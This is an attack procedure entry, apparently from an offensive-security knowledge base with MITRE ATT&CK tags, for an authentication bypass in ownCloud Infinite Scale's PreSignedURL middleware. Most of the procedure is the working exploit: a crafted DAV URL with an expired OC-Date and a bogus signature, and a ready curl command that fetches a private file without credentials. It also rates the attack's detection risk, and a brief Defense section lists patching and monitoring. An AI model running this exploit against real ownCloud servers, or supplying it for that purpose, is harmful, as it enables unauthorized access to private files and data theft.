---
id: proc-uuid-002
tags:
  - auth-bypass
  - presigned-url
  - exploitation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-owncloud-presigned-bypass]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:31:42.789Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-Expired-PreSignedURL-for-Auth-Bypass

## Summary

This procedure exploits a vulnerability in ownCloud Infinite Scale's PreSignedURL middleware by crafting a URL with an expired OC-Date, causing the signature validation to be skipped and allowing unauthorized access to private files.

## Description

The root cause lies in the services/proxy/pkg/middleware/signed_url_auth.go file, where the urlIsExpired function returns a nil error for expired dates, bypassing the validate function's signature check. With knowledge of the username and filename, an attacker can construct a GET request to /remote.php/dav/files/{username}/{filename} using parameters like OC-Credential, OC-Verb=GET, OC-Expires=60, an expired OC-Date (e.g., 2024-01-27T00:00:00.000Z), and any invalid OC-Signature. This grants access without authentication, exposing sensitive data. The target environment is a web-based ownCloud instance on port 9200.

## Requirements

1. Knowledge of target username (e.g., 'admin') and private filename (e.g., 'secret.txt')
2. Network access to the ownCloud DAV endpoint (https://target:9200)
3. Tool like curl for sending the HTTP request

## Defense

Defensive measures and detection strategies:

- Disable PreSignedURL feature if not needed via ownCloud configuration
- Implement strict signature validation that does not skip on expiry; patch the urlIsExpired function to enforce checks
- Monitor DAV endpoint access logs for anomalous query parameters like expired OC-Date or invalid signatures
- Use web application firewall (WAF) rules to block suspicious PreSignedURL patterns

## Objectives

1. Bypass authentication to access private files
2. Retrieve sensitive file content without credentials
3. Demonstrate exposure of data when username/filename is known

## Instructions

### Step 1: Construct the Malicious URL

**Context**: Build the PreSignedURL with expired date to trigger the bypass.

No command; manually assemble: https://{host:9200}/remote.php/dav/files/{username}/{filename}?OC-Credential={username}&OC-Verb=GET&OC-Expires=60&OC-Date=2024-01-27T00:00:00.000Z&OC-Signature=notchecked

> Use a past timestamp for OC-Date to ensure expiry. Expected: Valid URL string.

### Step 2: Execute the Request

**Context**: Send the GET request to retrieve the file without auth.

**Command** ([[commands/curl-owncloud-presigned-bypass]]):
```bash
curl "https://localhost:9200/remote.php/dav/files/admin/secret.txt?OC-Credential=admin&OC-Verb=GET&OC-Expires=60&OC-Date=2024-01-27T00:00:00.000Z&OC-Signature=notchecked"
```

> This sends an unauthenticated request; the server skips signature check due to expiry. Expected: HTTP 200 with file content 'secret file content'.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-owncloud-presigned-bypass]]

## Tools Used


## Tags

- [[auth-bypass]]
- [[presigned-url]]
- [[exploitation]]
